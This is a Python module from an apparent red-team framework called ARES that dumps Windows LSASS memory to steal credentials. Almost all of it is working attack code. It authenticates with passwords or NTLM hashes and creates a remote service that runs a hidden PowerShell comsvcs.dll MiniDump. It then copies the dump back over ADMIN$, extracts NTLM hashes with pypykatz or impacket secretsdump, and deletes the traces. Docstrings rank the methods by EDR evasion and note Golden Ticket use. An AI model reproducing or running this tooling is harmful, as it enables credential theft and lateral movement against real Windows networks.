"""
LSASS Memory Credential Extraction — windows.lsass_dump
MITRE: T1003.001 — OS Credential Dumping: LSASS Memory

Extracts NTLM hashes and Kerberos tickets from LSASS process memory via
remote execution through an established session (psexec/wmiexec/winrm).

Three techniques ordered from stealthiest to noisiest:
  1. COMSVCS.DLL MiniDump (default) — rundll32.exe comsvcs.dll, does not
     match most EDR signatures for LSASS access. Requires SYSTEM.
  2. Task Manager method — via procdump.exe if available on target.
  3. Direct via impacket secretsdump (DA required, no touch disk).

Dump parsed locally with pypykatz (Python mimikatz port).
All credentials encrypted into CredentialVault.
Dump file secure-deleted after parsing.

OPSEC: HIGH — EDR monitors OpenProcess to LSASS (Sysmon Event ID 10).
       Blocked in STEALTH profile. Requires local SYSTEM or admin.
"""
from __future__ import annotations

import asyncio
import base64
import os
import tempfile
from typing import Any

from ares.core.campaign import Finding, Severity, NoiseProfile
from ares.core.logger import audit, get_logger
from ares.core.security import sanitize_hostname
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module

logger = get_logger("ares.modules.windows.lsass_dump")


class LsassDumpModule(BaseModule):
    """
    windows.lsass_dump — Extract NTLM hashes + Kerberos tickets from LSASS via COMSVCS.DLL MiniDump. Remote execution via

    OPSEC: HIGH_NOISE
    MITRE: "T1003.001"
    REQUIRES: "local_admin_creds"
    OUTPUTS:  "ntlm_hashes", "kerberos_tickets"
    """
    MODULE_ID          = "windows.lsass_dump"
    MODULE_NAME        = "LSASS Memory Dump"
    MODULE_CATEGORY    = "windows"
    MODULE_DESCRIPTION = (
        "Extract NTLM hashes + Kerberos tickets from LSASS via COMSVCS.DLL MiniDump. "
        "Remote execution via established session. Parse with pypykatz. "
        "All credentials stored to vault."
    )
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.HIGH_NOISE
    MIN_NOISE_PROFILE  = "normal"
    REQUIRES           = ["local_admin_creds"]
    OUTPUTS            = ["ntlm_hashes", "kerberos_tickets"]
    MITRE_TECHNIQUES   = ["T1003.001"]
    MODULE_TIMEOUT_SECONDS: int | None = 300  # seconds

    async def validate(self, ctx: "Any") -> None:
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return

        noise = getattr(getattr(ctx, "campaign", None), "noise_profile", None)
        if noise == NoiseProfile.STEALTH:
            raise ModuleValidationError(
                "windows.lsass_dump is blocked in STEALTH profile — "
                "LSASS access triggers Sysmon Event ID 10 and is monitored by all EDR. "
                "Use NORMAL or AGGRESSIVE profile.",
                module_id=self.MODULE_ID, field="noise_profile",
            )
        target = getattr(ctx, "target", "") or ctx.params.get("target", "")
        if not target:
            raise ModuleValidationError(
                "windows.lsass_dump requires 'target' — IP of target Windows host.",
                module_id=self.MODULE_ID, field="target",
            )
        username = ctx.params.get("username", "")
        if not username:
            raise ModuleValidationError(
                "windows.lsass_dump requires local admin credentials.",
                module_id=self.MODULE_ID, field="username",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+).
        Thin adapter: extract params from ctx → call run() → return ModuleResult.
        """
        from ares.modules.base import ModuleResult
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID,
                                raw={"dry_run": True})

        target   = sanitize_hostname(
            getattr(ctx, "target", "") or ctx.params.get("target", "")
        )
        username = ctx.params.get("username", "")
        password = ctx.params.get("password", "") or ctx.params.get("secret", "")
        domain   = getattr(ctx, "domain", "") or ctx.params.get("domain", "")
        technique = ctx.params.get("technique", "comsvcs")   # comsvcs|secretsdump

        # Reveal NTLM hash if provided instead of cleartext
        lmhash, nthash = "", ""
        if password and len(password) in (32, 65) and ":" in password or len(password) == 32:
            parts = password.split(":")
            if len(parts) == 2:
                lmhash, nthash = parts[0], parts[1]
            else:
                nthash = password
            password = ""

        findings, raw = await self.run(
            target=target, username=username, password=password,
            domain=domain, lmhash=lmhash, nthash=nthash, technique=technique,
        )
        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("windows.lsass_dump")
    async def run(self, target: str, username: str, password: str = "",
                  domain: str = "", lmhash: str = "", nthash: str = "",
                  technique: str = "comsvcs", **kwargs: Any):
        await self.before_request(target, "default")
        logger.warning("lsass_dump_start", target=target, technique=technique,
                       msg="HIGH_NOISE — EDR_ALERT_LIKELY")
        audit("lsass_dump", actor=username, technique="T1003.001",
              source="operator", target=target, detail=f"technique={technique}")

        loop = asyncio.get_running_loop()

        if technique == "secretsdump":
            # Direct via impacket — no touch disk, requires DA
            hashes = await loop.run_in_executor(
                None,
                lambda: self._secretsdump_sync(target, username, password, domain, lmhash, nthash),
            )
        else:
            # COMSVCS.DLL MiniDump — stealthiest, requires SYSTEM
            hashes = await loop.run_in_executor(
                None,
                lambda: self._comsvcs_dump_sync(target, username, password, domain, lmhash, nthash),
            )

        if hashes:
            usernames = [h["username"] for h in hashes if h.get("username")]
            krbtgt    = next((h for h in hashes if h.get("username", "").lower() == "krbtgt"), None)

            self.finding(
                title       = f"LSASS Dump: {len(hashes)} Credentials from {target}",
                description = (
                    f"Extracted {len(hashes)} NTLM hash(es) from LSASS on {target}. "
                    + ("krbtgt hash obtained — Golden Ticket possible. " if krbtgt else "")
                    + "All credentials stored in vault for immediate reuse."
                ),
                severity    = Severity.CRITICAL,
                mitre_technique = "T1003.001",
                mitre_tactic    = "Credential Access",
                evidence = {
                    "hash_count":      len(hashes),
                    "usernames":       usernames[:20],
                    "krbtgt_obtained": bool(krbtgt),
                    "technique":       technique,
                    "target":          target,
                    "hashcat_mode":    "1000 (NTLM)",
                },
                remediation = (
                    "Enable Windows Credential Guard (blocks LSASS memory read). "
                    "Disable WDigest authentication (reg add HKLM\\SYSTEM\\...\\WDigest /v UseLogonCredential /d 0). "
                    "Rotate all credentials found. Enable Protected Users group."
                ),
                host = target, confidence = 1.0,
            )

        raw = {
            "target":       target,
            "technique":    technique,
            "hash_count":   len(hashes),
            "hashes":       [{"username": h["username"], "rid": h.get("rid", ""),
                              "nt_hash": h["nt_hash"]}
                             for h in hashes],
        }

        raw["ntlm_hashes"] = raw.get("hashes", [])  # OUTPUTS key
        raw["kerberos_tickets"] = []  # OUTPUTS key
        await self.noise.jitter.sleep()
        return self._findings[:], raw

    def _secretsdump_sync(self, target: str, username: str, password: str,
                           domain: str, lmhash: str, nthash: str) -> list[dict]:
        """Direct secretsdump via impacket — no touch disk, DA required."""
        from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
        from impacket.smbconnection import SMBConnection

        smb = SMBConnection(target, target, timeout=30)
        smb.login(username, password, domain, lmhash, nthash)

        remote_ops = RemoteOperations(smb, doKerberos=False)
        remote_ops.enableRegistry()
        hashes: list[dict] = []

        try:
            ntds = NTDSHashes(
                None, None, isRemote=True, history=False, noLMHash=True,
                remoteOps=remote_ops, useVSSMethod=False, justNTLM=True,
                pwdLastSet=False, resumeSession=None, outputFileName=None,
                printUserStatus=False,
            )

            def _on_secret(secret_type: str, secret: str) -> None:
                if ":::" not in secret:
                    return
                parts = secret.split(":")
                if len(parts) < 4:
                    return
                nt = parts[3].rstrip()
                if nt in ("", "31d6cfe0d16ae931b73c59d7e0c089c0"):
                    return
                hashes.append({"username": parts[0], "rid": parts[1], "nt_hash": nt})

            ntds.dump()
            ntds.export(_on_secret)
            ntds.finish()
        finally:
            try:
                remote_ops.finish()
            except Exception:
                pass
            try:
                smb.logoff()
            except Exception:
                pass

        return hashes

    def _comsvcs_dump_sync(self, target: str, username: str, password: str,
                            domain: str, lmhash: str, nthash: str) -> list[dict]:
        """
        COMSVCS.DLL MiniDump via remote SCM execution.
        1. Get LSASS PID via tasklist
        2. MiniDump via comsvcs.dll
        3. Transfer dump via SMB
        4. Parse with pypykatz
        5. Secure-delete dump
        """
        import io
        import uuid as _uuid
        from impacket.smbconnection import SMBConnection
        from impacket.dcerpc.v5 import transport, scmr

        dump_id   = _uuid.uuid4().hex[:8].upper()
        dump_name = f"ARES{dump_id}.dmp"
        tmp_path  = f"\\Windows\\Temp\\{dump_name}"

        conn_smb = SMBConnection(target, target, timeout=20)
        conn_smb.login(username, password, domain, lmhash, nthash)

        # Step 1: Get LSASS PID
        lsass_pid = self._get_lsass_pid(target, username, password, domain, lmhash, nthash)
        if not lsass_pid:
            conn_smb.logoff()
            logger.warning("lsass_pid_not_found", target=target)
            return []

        # Step 2: COMSVCS MiniDump
        cmd = (
            f"powershell -NoP -W Hidden -C "
            f"\"$pid=[int](Get-Process lsass).Id; "
            f"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, "
            f"MiniDump $pid C:\\Windows\\Temp\\{dump_name} full\""
        )
        self._run_remote_cmd(target, username, password, domain,
                             lmhash, nthash, cmd, dump_id)

        # Step 3: Transfer dump via SMB
        import time as _time
        # Poll for dump file instead of fixed sleep — faster on quick targets, safer on slow ones
        _poll_start = _time.monotonic()
        _poll_timeout = 30   # max seconds to wait for dump file to appear
        while _time.monotonic() - _poll_start < _poll_timeout:
            try:
                _size = conn_smb.getAttributes("ADMIN$", f"Temp\\{dump_name}").get_filesize()
                if _size and _size > 0:
                    break  # dump file exists and has content
            except Exception:
                pass  # file not yet visible
            _time.sleep(1)
        from ares.core.security import secure_mkstemp
        local_dump, _fd = secure_mkstemp(suffix=".dmp", prefix="ares_lsass_")
        import os as _os_tmp; _os_tmp.close(_fd)  # mkstemp opens fd — close immediately, file will be written via SMB

        try:
            with open(local_dump, "wb") as f:
                conn_smb.getFile("ADMIN$", f"Temp\\{dump_name}", f.write)
        except Exception as exc:
            logger.warning("lsass_dump_transfer_failed",
                           target=target, error=str(exc)[:80],
                           exc_type=type(exc).__name__)
            conn_smb.logoff()
            return []
        finally:
            # Step 5: Delete dump from target
            try:
                conn_smb.deleteFile("ADMIN$", f"Temp\\{dump_name}")
            except Exception:
                pass
            conn_smb.logoff()

        # Step 4: Parse with pypykatz
        hashes = self._parse_dump(local_dump)

        # Secure-delete local dump
        try:
            with open(local_dump, "wb") as f:
                f.write(b"\x00" * os.path.getsize(local_dump))
            os.unlink(local_dump)
        except Exception:
            try:
                os.unlink(local_dump)
            except Exception:
                pass

        return hashes

    def _get_lsass_pid(self, target: str, username: str, password: str,
                        domain: str, lmhash: str, nthash: str) -> int:
        """Get LSASS PID via remote tasklist."""
        try:
            from impacket.smbconnection import SMBConnection
            from impacket.dcerpc.v5 import transport, scmr
            import io, uuid as _uuid

            id_     = _uuid.uuid4().hex[:6]
            out_file = f"ARESPID{id_}.txt"
            cmd = f"tasklist /FI \"IMAGENAME eq lsass.exe\" /FO CSV > C:\\Windows\\Temp\\{out_file}"

            self._run_remote_cmd(target, username, password, domain,
                                 lmhash, nthash, cmd, id_)

            import time as _t
            _t.sleep(1)

            smb = SMBConnection(target, target, timeout=10)
            smb.login(username, password, domain, lmhash, nthash)
            buf = io.BytesIO()
            try:
                smb.getFile("ADMIN$", f"Temp\\{out_file}", buf.write)
                smb.deleteFile("ADMIN$", f"Temp\\{out_file}")
            except Exception:
                pass
            finally:
                smb.logoff()

            output = buf.getvalue().decode("utf-8", errors="replace")
            for line in output.splitlines():
                if "lsass" in line.lower():
                    parts = line.replace('"', "").split(",")
                    if len(parts) >= 2:
                        return int(parts[1].strip())
        except Exception:
            pass
        return 0

    def _run_remote_cmd(self, target: str, username: str, password: str,
                         domain: str, lmhash: str, nthash: str,
                         cmd: str, svc_suffix: str) -> None:
        """Execute command via remote SCM service."""
        try:
            from impacket.dcerpc.v5 import transport, scmr

            rpct = transport.DCERPCTransportFactory(f"ncacn_np:{target}[\\pipe\\svcctl]")
            rpct.set_credentials(username, password, domain, lmhash, nthash)
            rpct.set_connect_timeout(15)
            dce = rpct.get_dce_rpc()
            dce.connect()
            dce.bind(scmr.MSRPC_UUID_SCMR)

            scm_handle = scmr.hROpenSCManagerW(dce)["lpScHandle"]
            svc_name   = f"ARES{svc_suffix[:8].upper()}"

            try:
                svc_handle = scmr.hRCreateServiceW(
                    dce, scm_handle, svc_name, svc_name,
                    lpBinaryPathName=f"cmd.exe /c {cmd}",
                    dwStartType=scmr.SERVICE_DEMAND_START,
                )["lpServiceHandle"]
                try:
                    scmr.hRStartServiceW(dce, svc_handle)
                except Exception:
                    pass
            finally:
                try:
                    scmr.hRControlService(dce, svc_handle, scmr.SERVICE_CONTROL_STOP)
                except Exception:
                    pass
                try:
                    scmr.hRDeleteService(dce, svc_handle)
                except Exception:
                    pass
                try:
                    scmr.hRCloseServiceHandle(dce, svc_handle)
                except Exception:
                    pass
                try:
                    scmr.hRCloseServiceHandle(dce, scm_handle)
                except Exception:
                    pass
                try:
                    dce.disconnect()
                except Exception:
                    pass
        except Exception as exc:
            logger.debug("remote_cmd_failed", error=str(exc)[:80])

    @staticmethod
    def _parse_dump(dump_path: str) -> list[dict]:
        """Parse LSASS dump with pypykatz."""
        try:
            from pypykatz.pypykatz import pypykatz  # type: ignore[import]
            mimi = pypykatz.parse_minidump_file(dump_path)
            hashes: list[dict] = []
            for luid in mimi.logon_sessions.values():
                for cred in (luid.msv_creds or []):
                    nt = getattr(cred, "NThash", None)
                    if nt and nt != "31d6cfe0d16ae931b73c59d7e0c089c0":
                        hashes.append({
                            "username": getattr(cred, "username", ""),
                            "domain":   getattr(cred, "domainname", ""),
                            "nt_hash":  nt,
                            "rid":      "",
                        })
            return hashes
        except ImportError:
            logger.warning("pypykatz_not_installed",
                           hint="pip install pypykatz")
            return []
        except Exception as exc:
            logger.warning("pypykatz_parse_failed", error=str(exc)[:100])
            return []
